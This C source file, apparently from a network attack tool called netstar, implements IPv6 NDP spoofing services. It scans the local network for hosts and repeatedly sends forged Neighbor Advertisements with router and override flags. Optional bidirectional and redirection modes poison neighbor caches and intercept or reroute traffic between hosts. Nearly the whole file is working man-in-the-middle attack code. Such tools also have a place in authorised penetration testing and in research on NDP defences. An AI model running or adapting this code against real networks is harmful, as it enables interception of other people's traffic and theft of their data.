#include "netstar-ndp-spoofing.h"

#include <netstar-services.h>
#include <netstar-threads.h>

#include <netstar-capture.h>
#include <netstar-forward.h>

#include <netstar-scanner.h>
#include <netstar-recon.h>

#include <inttypes.h>
#include <stdlib.h>


static bool netstar_ndp_network_spoofing_initialized;


static void *
netstar_ndp_network_spoofing(void *context) {
  netstar_thread_t *thread = (netstar_thread_t *)context;

  struct netstar_ndp_network_spoofing *spoofing_attack = (struct netstar_ndp_network_spoofing *)thread->args;
  netstar_t *netstar = spoofing_attack->netstar;

  netstar_hosts_iterator_t spoofed_hosts_iter = NULL, target_hosts_iter = NULL;

  netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;

  netstar_log(
    "\b \b[ ndp@network-spoofing ]: network-scan-interval: %" PRIu32 "s; "
                                   "spoof-burst-interval: %" PRIu32 "s; "
                                   "spoof-burst-count: %zu; "
                                   "spoof-steady-interval: %" PRIu32 "\r\n",
    netstar_time_millisecstosecs(spoofing_attack->network_scan_interval),
    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
    spoofing_attack->spoof_burst_count,
    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
  );

  netstar_recon_hosts6(netstar, spoofing_attack->spoofed_hosts);

  if (spoofing_attack->redirective)
    netstar_recon_host6(netstar, &spoofing_attack->redirection_host);

  netstar_log("\b \b[ ndp@network-spoofing ] initializing host reconnaissances on the network\r\n");

  while (thread->status && netstar_hosts_size(netstar_scanner_scanned_hosts6) < 2) {
    netstar_time_sleep(spoofing_attack->spoof_steady_interval);
    continue;
  }

  netstar_log("\b \b[ ndp@network-spoofing ] discovered %zu hosts; starting attack\r\n", netstar_hosts_size(netstar_scanner_scanned_hosts6));

  if (spoofing_attack->redirective)
    netstar_log("\b \b[ ndp@network-spoofing ] running on redirectional mode\r\n");

  for (; thread->status;) {
    netstar_time_t remaining_time = netstar_timer(&timer);

    if (!remaining_time) {
      for (spoofed_hosts_iter = netstar_hosts_begin(netstar_scanner_scanned_hosts6); spoofed_hosts_iter; spoofed_hosts_iter = netstar_hosts_next(spoofed_hosts_iter)) {
        netstar_host_t *spoofed_host = netstar_hosts_value(spoofed_hosts_iter);

        if (netstar_hosts_size(spoofing_attack->protected_hosts) && (netstar_hosts_findipaddr6(spoofing_attack->protected_hosts, &spoofed_host->addr.v6) || netstar_hosts_findmac(spoofing_attack->protected_hosts, &spoofed_host->mac)))
          continue;

        if (spoofing_attack->redirective && netstar_host_equals(&spoofing_attack->redirection_host, spoofed_host))
          continue;

        if (netstar_hosts_size(spoofing_attack->spoofed_hosts) && !netstar_hosts_findipaddr6(spoofing_attack->spoofed_hosts, &spoofed_host->addr.v6))
          continue;

        for (target_hosts_iter = netstar_hosts_begin(netstar_scanner_scanned_hosts6); target_hosts_iter; target_hosts_iter = netstar_hosts_next(target_hosts_iter)) {
          netstar_host_t *target_host = netstar_hosts_value(target_hosts_iter);

          network_macaddr_t source_mac = netstar->managed.iface->mac;

          if (netstar_host_equals(spoofed_host, target_host))
            continue;

       // if (netstar_hosts_size(spoofing_attack->target_hosts) && !netstar_hosts_find(spoofing_attack->target_hosts, target_host))
       //   continue;

          if (netstar_hosts_size(spoofing_attack->protected_hosts) && (netstar_hosts_findipaddr6(spoofing_attack->protected_hosts, &target_host->addr.v6) || netstar_hosts_findmac(spoofing_attack->protected_hosts, &target_host->mac)))
            continue;

          if (spoofing_attack->redirective) {
            if (netstar_host_equals(&spoofing_attack->redirection_host, target_host))
              continue;

            source_mac = spoofing_attack->redirection_host.mac;
          }

          if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
            netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &spoofed_host->addr.v6, &target_host->addr.v6);

          netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &spoofed_host->addr.v6, &target_host->addr.v6, &source_mac);

          if (spoofing_attack->bidirectional) {
            if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
              netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &target_host->addr.v6, &spoofed_host->addr.v6);

            netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &target_host->addr.v6, &spoofed_host->addr.v6, &source_mac);
          }

#ifdef NETSTAR_DEBUG
          {
            char saddr[NETWORK_IPADDR6_STRLENGTH] = {0}, daddr[NETWORK_IPADDR6_STRLENGTH] = {0};

            network_ipaddr6_format(&spoofed_host->addr.v6, saddr, sizeof(saddr));
            network_ipaddr6_format(&target_host->addr.v6, daddr, sizeof(daddr));

            netstar_log("\b \b[ ndp@spoofing ] %s %s NDP Neighbor Advertisement (0x%02" PRIX8 ") %s spoofing %s %s\r\n",
              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
              NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT,
              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
              netstar_vendors_namebymac(&target_host->mac), daddr
            );
          }
#endif
          netstar_time_sleep(20);
        }
      }

      if (spoofing_attack->spoof_burst_count) {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
        spoofing_attack->spoof_burst_count--;
      } else {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
      }
    }

    netstar_time_sleep(netstar_time_secstomillisecs(2));
  }

  netstar_thread_exit(thread, NULL);
  return NULL;
}

int
netstar_ndp_network_spoofing_new(struct netstar_ndp_network_spoofing *spoofing_attack, netstar_t *netstar) {
  if (!(spoofing_attack->spoofed_hosts = netstar_hosts_new()))
    goto _return;

  if (!(spoofing_attack->protected_hosts = netstar_hosts_new()))
    goto _return;

  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
  spoofing_attack->spoof_burst_count      = 10;

  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));

  spoofing_attack->netstar = netstar;

  return 1;

_return:
  netstar_ndp_network_spoofing_free(spoofing_attack);
  return -1;
}

void
netstar_ndp_network_spoofing_free(struct netstar_ndp_network_spoofing *spoofing_attack) {
  if (spoofing_attack) {
    netstar_hosts_free(spoofing_attack->spoofed_hosts);
  }
}

static void
netstar_ndp_network_spoofing_initialize(netstar_t *netstar, void *context) {
  if (netstar_ndp_network_spoofing_initialized)
    return;

  netstar_ndp_network_spoofing_initialized = true;
}

static void
netstar_ndp_network_spoofing_deinitialize(void *context) {
  struct netstar_ndp_network_spoofing *spoofing_attack = (struct netstar_ndp_network_spoofing *)context;

  if (!netstar_ndp_network_spoofing_initialized)
    return;

  netstar_ndp_network_spoofing_free(spoofing_attack);

  netstar_ndp_network_spoofing_initialized = false;
}

void
netstar_ndp_network_spoofing_start(void *context) {
  struct netstar_ndp_network_spoofing *spoofing_attack = (struct netstar_ndp_network_spoofing *)context;

  spoofing_attack->thread = netstar_thread_spawn(netstar_ndp_network_spoofing, spoofing_attack);
}

void
netstar_ndp_network_spoofing_stop(void *context) {
  struct netstar_ndp_network_spoofing *spoofing_attack = (struct netstar_ndp_network_spoofing *)context;

  netstar_thread_kill(spoofing_attack->thread);
}

static struct netstar_ndp_network_spoofing netstar_ndp_network_spoofing_context;

static struct netstar_service netstar_ndp_network_spoofing_context_service = {
  netstar_ndp_network_spoofing_initialize, netstar_ndp_network_spoofing_deinitialize,
  netstar_ndp_network_spoofing_start, netstar_ndp_network_spoofing_stop,
  "netstar:ndp:network-spoofing", &netstar_ndp_network_spoofing_context,
};

struct netstar_service *
netstar_ndp_network_spoofing_service(void) {
  return &netstar_ndp_network_spoofing_context_service;
}


static bool netstar_ndp_spoofing_initialized;


static void *
netstar_ndp_spoofing(void *context) {
  netstar_thread_t *thread = (netstar_thread_t *)context;

  struct netstar_ndp_spoofing *spoofing_attack = (struct netstar_ndp_spoofing *)thread->args;
  netstar_hosts_iterator_t spoofed_hosts_iter = NULL, target_hosts_iter = NULL;
  netstar_t *netstar = spoofing_attack->netstar;

  netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;

  netstar_log("\b \b[ ndp@spoofing ]: spoof-burst-interval: %" PRIu32 "s; "
                                     "spoof-burst-count: %zu; "
                                     "spoof-steady-interval: %" PRIu32 "\r\n",
    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
    spoofing_attack->spoof_burst_count,
    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
  );

  if (spoofing_attack->redirective) {
    netstar_log("\b \b[ ndp@spoofing ] running on redirectional mode\r\n");
    netstar_recon_host6(netstar, &spoofing_attack->redirection_host);
  }

  netstar_recon_hosts6(netstar, spoofing_attack->spoofed_hosts);
  netstar_recon_hosts6(netstar, spoofing_attack->target_hosts);

  for (; thread->status;) {
    netstar_time_t remaining_time = netstar_timer(&timer);

    if (!remaining_time) {
      for (spoofed_hosts_iter = netstar_hosts_begin(spoofing_attack->spoofed_hosts); spoofed_hosts_iter; spoofed_hosts_iter = netstar_hosts_next(spoofed_hosts_iter)) {
        netstar_host_t *spoofed_host = netstar_hosts_value(spoofed_hosts_iter);

        if (spoofing_attack->redirective && netstar_host_equals(&spoofing_attack->redirection_host, spoofed_host))
          continue;

        for (target_hosts_iter = netstar_hosts_begin(spoofing_attack->target_hosts); target_hosts_iter; target_hosts_iter = netstar_hosts_next(target_hosts_iter)) {
          netstar_host_t *target_host = netstar_hosts_value(target_hosts_iter);
 
          network_macaddr_t source_mac = netstar->managed.iface->mac;

          if (spoofing_attack->redirective) {
            if (netstar_host_equals(&spoofing_attack->redirection_host, target_host))
              continue;

            source_mac = spoofing_attack->redirection_host.mac;
          }

          if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
            netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &spoofed_host->addr.v6, &target_host->addr.v6);

          netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &spoofed_host->addr.v6, &target_host->addr.v6, &source_mac);

          if (spoofing_attack->bidirectional) {
            if (!spoofing_attack->spoof_burst_count && !spoofing_attack->redirective)
              netstar_sendicmpv6echo(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMPV6_TYPE_ECHO, &target_host->addr.v6, &spoofed_host->addr.v6);

            netstar_sendndpadvert(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT, NETSTAR_NDP_ADVERT_FLAG_ROUTER|NETSTAR_NDP_ADVERT_FLAG_SOLICITED|NETSTAR_NDP_ADVERT_FLAG_OVERRIDE, &target_host->addr.v6, &spoofed_host->addr.v6, &source_mac);
          }

#ifdef NETSTAR_DEBUG
          {
            char saddr[NETWORK_IPADDR6_STRLENGTH] = {0}, daddr[NETWORK_IPADDR6_STRLENGTH] = {0};

            network_ipaddr6_format(&spoofed_host->addr.v6, saddr, sizeof(saddr));
            network_ipaddr6_format(&target_host->addr.v6, daddr, sizeof(daddr));

            netstar_log("\b \b[ ndp@spoofing ] %s %s NDP Neighbor Advertisement (0x%02" PRIX8 ") %s spoofing %s %s\r\n",
              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
              NETSTAR_NDP_TYPE_NEIGHBOR_ADVERT,
              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
              netstar_vendors_namebymac(&target_host->mac), daddr
            );
          }
#endif
          netstar_time_sleep(20);
        }
      }

      if (spoofing_attack->spoof_burst_count) {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
        spoofing_attack->spoof_burst_count--;
      } else {
        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
      }
    }

    netstar_time_sleep(netstar_time_secstomillisecs(2));
  }

  netstar_thread_exit(thread, NULL);
  return NULL;
}

int
netstar_ndp_spoofing_new(struct netstar_ndp_spoofing *spoofing_attack, netstar_t *netstar) {
  if (!(spoofing_attack->spoofed_hosts = netstar_hosts_new()))
    goto _return;
  if (!(spoofing_attack->target_hosts = netstar_hosts_new()))
    goto _return;

  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
  spoofing_attack->spoof_burst_count      = 10;

  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));

  spoofing_attack->netstar = netstar;

  return 1;

_return:
  netstar_ndp_spoofing_free(spoofing_attack);
  return -1;
}

void
netstar_ndp_spoofing_free(struct netstar_ndp_spoofing *spoofing_attack) {
  if (spoofing_attack) {
    netstar_hosts_free(spoofing_attack->spoofed_hosts);
    netstar_hosts_free(spoofing_attack->target_hosts);
  }
}

static void
netstar_ndp_spoofing_initialize(netstar_t *netstar, void *context) {
  if (netstar_ndp_spoofing_initialized)
    return;

  netstar_ndp_spoofing_initialized = true;
}

static void
netstar_ndp_spoofing_deinitialize(void *context) {
  struct netstar_ndp_spoofing *spoofing_attack = (struct netstar_ndp_spoofing *)context;

  if (!netstar_ndp_spoofing_initialized)
    return;

  netstar_ndp_spoofing_free(spoofing_attack);

  netstar_ndp_spoofing_initialized = false;
}

static void
netstar_ndp_spoofing_start(void *context) {
  struct netstar_ndp_spoofing *spoofing_attack = (struct netstar_ndp_spoofing *)context;

  spoofing_attack->thread = netstar_thread_spawn(netstar_ndp_spoofing, spoofing_attack);
}

static void
netstar_ndp_spoofing_stop(void *context) {
  struct netstar_ndp_spoofing *spoofing_attack = (struct netstar_ndp_spoofing *)context;

  netstar_thread_kill(spoofing_attack->thread);
}

static struct netstar_ndp_spoofing netstar_ndp_spoofing_context;

static struct netstar_service netstar_ndp_spoofing_context_service = {
  netstar_ndp_spoofing_initialize, netstar_ndp_spoofing_deinitialize,
  netstar_ndp_spoofing_start, netstar_ndp_spoofing_stop,
  "netstar:ndp:spoofing", &netstar_ndp_spoofing_context,
};

struct netstar_service *
netstar_ndp_spoofing_service(void) {
  return &netstar_ndp_spoofing_context_service;
}


__attribute__((__constructor__))
static inline void
netstar_ndp_register_services(void) {
  netstar_services_register(netstar_ndp_network_spoofing_service());
  netstar_services_register(netstar_ndp_spoofing_service());
}
